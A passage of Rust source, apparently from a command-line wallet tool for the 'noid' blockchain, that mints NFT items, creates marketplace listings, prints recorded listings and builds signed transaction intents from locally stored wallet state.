                .unwrap_or([0xd2; 32]);
            let secret = wallet_secret("seller")?;
            let address = derive_address(&secret);
            let view = fetch_view(&url)?;
            let state = State::load()?;
            let record = state
                .json
                .get("collections")
                .and_then(|c| c.get("seller"))
                .cloned()
                .context("collection not recorded")?;
            let collection = reconstruct_collection(&record)?;
            let utxos = fetch_utxos(&url, &address)?;
            let cash = utxos.first().context("seller wallet needs cash")?;
            let out_slot = take_slots(&url, 1, 20_000)?[0];
            let (intent, items, item_slots) = mint_items(
                &url,
                secret,
                &collection,
                noid_tx::TxInput {
                    slot_index: cash.slot_index,
                    amount: cash.amount,
                    creation_id: cash.creation_id,
                },
                count,
                metadata,
                &view,
                epoch_anchor(&url)?,
                out_slot,
            )?;
            let fee = intent.pages[0].body.fee;
            match submit_intent(&url, &intent.to_bytes()?) {
                Ok(txid) => {
                    let mut state = State::load()?;
                    for (i, item) in items.iter().enumerate() {
                        state.json["items"].as_array_mut().unwrap().push(
                            serde_json::json!({
                                "wallet": "seller",
                                "slot": item_slots[i],
                                "creation_id": null,
                                "serial": item.serial,
                                "metadata": hexs(&item.metadata),
                            }),
                        );
                    }
                    state.json["collections"]["seller"]["issued"] =
                        serde_json::json!(collection.collection.issued_items + count as u64);
                    state.save()?;
                    println!(
                        "mint ADMITTED txid={txid} fee={fee} item_slots={:?}",
                        item_slots
                    );
                }
                Err(error) => println!("mint REJECTED fee={fee} error={error}"),
            }
        }
        "list" => {
            // list <item-index> <ask-micronoid>
            let item_index: usize = rest.first().context("item index")?.parse()?;
            let ask: u64 = rest.get(1).context("ask")?.parse()?;
            let secret = wallet_secret("seller")?;
            let address = derive_address(&secret);
            let view = fetch_view(&url)?;
            let state = State::load()?;
            let item_record = state
                .json
                .get("items")
                .and_then(|i| i.as_array())
                .context("items")?
                .get(item_index)
                .cloned()
                .context("item index not recorded")?;
            let collection_record = state
                .json
                .get("collections")
                .and_then(|c| c.get("seller"))
                .cloned()
                .context("collection record")?;
            let collection = reconstruct_collection(&collection_record)?;
            let mut item_json = item_record.clone();
            item_json["owner"] = serde_json::json!(address_hex(&address));
            let item = reconstruct_item(&item_json, &collection.collection)?;
            let item_slot = item_record["slot"].as_u64().context("item slot")? as u32;
            let item_creation_id = item_record["creation_id"]
                .as_u64()
                .context("item creation_id not confirmed (run `confirm` after mining)")?;
            let cash = fetch_utxos(&url, &address)?
                .into_iter()
                .find(|u| u.amount > NFT_FEE_CREDIT + 20_000)
                .context("seller wallet needs cash for escrow+fee")?;
            let out_slot = take_slots(&url, 1, 40_000)?[0];
            let (intent, definition, listing) = create_listing(
                &url,
                secret,
                &item,
                item_slot,
                item_creation_id,
                noid_tx::TxInput {
                    slot_index: cash.slot_index,
                    amount: cash.amount,
                    creation_id: cash.creation_id,
                },
                ask,
                &view,
                epoch_anchor(&url)?,
                out_slot,
            )?;
            let fee = intent.pages[0].body.fee;
            match submit_intent(&url, &intent.to_bytes()?) {
                Ok(txid) => {
                    let mut state = State::load()?;
                    state.json["listings"].as_array_mut().unwrap().push(
                        serde_json::json!({
                            "slot": out_slot,
                            "creation_id": null,
                            "ask": ask,
                            "definition": {
                                "collection": hexs(&definition.collection.0),
                                "seller": address_hex(&definition.seller),
                                "metadata": hexs(&definition.metadata),
                                "serial": definition.serial,
                                "source_creation_id": definition.source_creation_id,
                                "ask": definition.ask,
                                "expiry_height": definition.expiry_height,
                            }
                        }),
                    );
                    state.save()?;
                    println!(
                        "list ADMITTED txid={txid} fee={fee} listing_slot={out_slot} \
                         collection={} serial={} ask={ask}",
                        hexs(&definition.collection.0),
                        definition.serial
                    );
                }
                Err(error) => println!("list REJECTED fee={fee} error={error}"),
            }
        }
        "listings" => {
            let state = State::load()?;
            for (i, listing) in state
                .json
                .get("listings")
                .and_then(|l| l.as_array())
                .context("listings")?
                .iter()
                .enumerate()
            {
                println!(
                    "{}: slot={} confirmed={} ask={} collection={} serial={}",
                    i,
                    listing["slot"],
                    if listing["creation_id"].is_null() { "no" } else { "yes" },
                    listing["ask"],
                    listing["definition"]["collection"],
                    listing["definition"]["serial"],
                );
            }
        }
        _ => bail!("unknown command {cmd:?}"),
    }
    Ok(())
}

fn parse_request(rest: &[String]) -> Result<NativeWalletRequest> {
    // request-json buy-nft <collection-hex> <serial> <max-ask>
    match rest.first().map(|s| s.as_str()) {
        Some("buy-nft") => Ok(NativeWalletRequest::BuyNft {
            collection_id: rest.get(1).context("collection hex")?.clone(),
            serial: rest.get(2).context("serial")?.clone(),
            maximum_ask_micronoid: rest.get(3).context("max ask")?.clone(),
        }),
        Some("list-nft") => Ok(NativeWalletRequest::ListNft {
            collection_id: rest.get(1).context("collection hex")?.clone(),
            serial: rest.get(2).context("serial")?.clone(),
            ask_micronoid: rest.get(3).context("ask")?.clone(),
            expiry_height: rest.get(4).context("expiry")?.parse()?,
        }),
        _ => bail!("unknown request kind {:?}", rest.first()),
    }
}

fn reconstruct_item(item: &serde_json::Value, collection: &NftCollection) -> Result<NftItem> {
    Ok(NftItem {
        collection: collection.collection,
        owner: address_from_hex(item["owner"].as_str().context("item owner")?)?,
        metadata: hex32(item["metadata"].as_str().context("item metadata")?)?,
        serial: item["serial"].as_u64().context("serial")?,
        unlock_height: 0,
    })
}

fn mint_items(
    url: &str,
    secret: SpendSecret,
    collection: &CollectionRecord,
    cash: noid_tx::TxInput,
    count: usize,
    metadata: [u8; 32],
    view: &StateView,
    epoch_anchor: [u8; 32],
    output_slot: u32,
) -> Result<(NativeIntent, Vec<NftItem>, Vec<u32>)> {
    use noid_tx::native_assets::NativeOpening;
    let owner = derive_address(&secret);
    let height = view.tip_height + 1;
    let next_serial = collection.collection.issued_items + 1;
    let mut items = Vec::new();
    for i in 0..count {
        let mut item_metadata = metadata;
        item_metadata[3] = (i as u8).wrapping_add(1);
        items.push(NftItem {
            collection: collection.collection.collection,
            owner,
            metadata: item_metadata,
            serial: next_serial + i as u64,
            unlock_height: 0,
        });
    }
    let minted = NftCollection {
        issued_items: collection.collection.issued_items + items.len() as u64,
        ..collection.collection
    };
    let n_in = 2usize;
    let n_out = 1 + items.len() + 1;
    let fee = fee_breakdown(n_in as u64, n_out as u64, view.active_slot_count, view.log_slots)
        .required_total;
    let old_opening = NativeOpening::NftCollection(collection.collection);
    let new_opening = NativeOpening::NftCollection(minted);
    let item_slots = take_slots(url, items.len(), output_slot.saturating_add(1))?;
    let mut outputs = vec![NativeOutputClaim {
        output: noid_tx::TxOutput {
            slot_index: output_slot,
            amount: 0,
            owner: new_opening.root(),
        },
        opening: Some(new_opening),
    }];
    for (i, item) in items.iter().enumerate() {
        let opening = NativeOpening::NftItem(*item);
        outputs.push(NativeOutputClaim {
            output: noid_tx::TxOutput {
                slot_index: item_slots[i],
                amount: 0,
                owner: opening.root(),
            },
            opening: Some(opening),
        });
    }
    outputs.push(NativeOutputClaim {
        output: noid_tx::TxOutput {
            slot_index: 0,
            amount: cash.amount - fee,
            owner,
        },
        opening: None,
    });
    let context = noid_tx::native_assets::transition::NativeContext {
        chain: noid_chain::state::native_assets::native_chain_id(),
        height,
        authority: owner,
        fee,
    };
    let mut intent = NativeIntent::from_claims(
        &context,
        epoch_anchor,
        NativeOperation::MintNft,
        vec![
            NativeInputClaim {
                input: noid_tx::TxInput {
                    slot_index: collection.slot,
                    amount: 0,
                    creation_id: collection.creation_id,
                },
                root: old_opening.root(),
                opening: Some(old_opening),
            },
            NativeInputClaim {
                input: cash,
                root: owner,
                opening: None,
            },
        ],
        outputs,
    )
    .context("mint claims")?;
    assign_output_slots(url, &mut intent)?;
    let proof = noid_gkr::wallet_authorization::prove_native_financial_authorization(
        &intent,
        context.chain,
        nft_round(view)?,
        OwnerAuthWitness::new(secret),
        owner_authorization_version(height),
    )?;
    intent.authorization_bytes = proof.to_bytes()?;
    Ok((intent, items, item_slots))
}

fn create_listing(
    url: &str,
    secret: SpendSecret,
    item: &NftItem,
    item_slot: u32,
    item_creation_id: u64,
    cash: noid_tx::TxInput,
    ask: u64,
    view: &StateView,
    epoch_anchor: [u8; 32],
    output_slot: u32,
) -> Result<(NativeIntent, ListingDefinition, ListingState)> {
    use noid_tx::native_assets::financial::{FinancialOperation, NativeParentRef};
    use noid_tx::native_assets::NativeOpening;
    let owner = derive_address(&secret);
    let height = view.tip_height + 1;
    let definition = ListingDefinition::from_item(
        *item,
        item_creation_id,
        ask,
        height + 400,
        height,
    )
    .context("listing definition")?;
    let listing = ListingState::initial(definition).context("listing state")?;
    let fee = fee_breakdown(2, 2, view.active_slot_count, view.log_slots).required_total;
    let item_opening = NativeOpening::NftItem(*item);
    let listing_opening = NativeOpening::NftMarket(NftMarketOpening::Listing(listing));
    let definition_opening = NativeOpening::NftMarket(NftMarketOpening::Definition(definition));
    let outputs = vec![
        NativeOutputClaim {
            output: noid_tx::TxOutput {
                slot_index: output_slot,
                amount: NFT_FEE_CREDIT,
                owner: listing_opening.root(),
            },
            opening: Some(listing_opening),
        },
        NativeOutputClaim {
            output: noid_tx::TxOutput {
                slot_index: 0,
                amount: cash.amount - fee - NFT_FEE_CREDIT,
                owner,
            },
            opening: None,
        },
    ];
    let round = nft_round(view)?;
    let context = noid_tx::native_assets::transition::NativeContext {
        chain: noid_chain::state::native_assets::native_chain_id(),
        height,
        authority: owner,
        fee,
    };
    let mut intent = NativeIntent::from_financial_claims(
        &context,
        epoch_anchor,
        FinancialOperation::CreateListing {
            definition: definition_opening.root(),
        },
        round,
        vec![
            NativeInputClaim {
                input: noid_tx::TxInput {
                    slot_index: item_slot,
                    amount: 0,
                    creation_id: item_creation_id,
                },
                root: item_opening.root(),
                opening: Some(item_opening),
            },
            NativeInputClaim {
                input: cash,
                root: owner,
                opening: None,
            },
        ],
        outputs,
        |root| {
            if root == definition_opening.root() {
                Some(definition_opening)
            } else {
                None
            }
        },
    )
    .context("listing claims")?;
    assign_output_slots(url, &mut intent)?;
    let proof = noid_gkr::wallet_authorization::prove_native_financial_authorization(
        &intent,
        context.chain,
        round,
        OwnerAuthWitness::new(secret),
        owner_authorization_version(height),
    )?;
    intent.authorization_bytes = proof.to_bytes()?;
    Ok((intent, definition, listing))
}
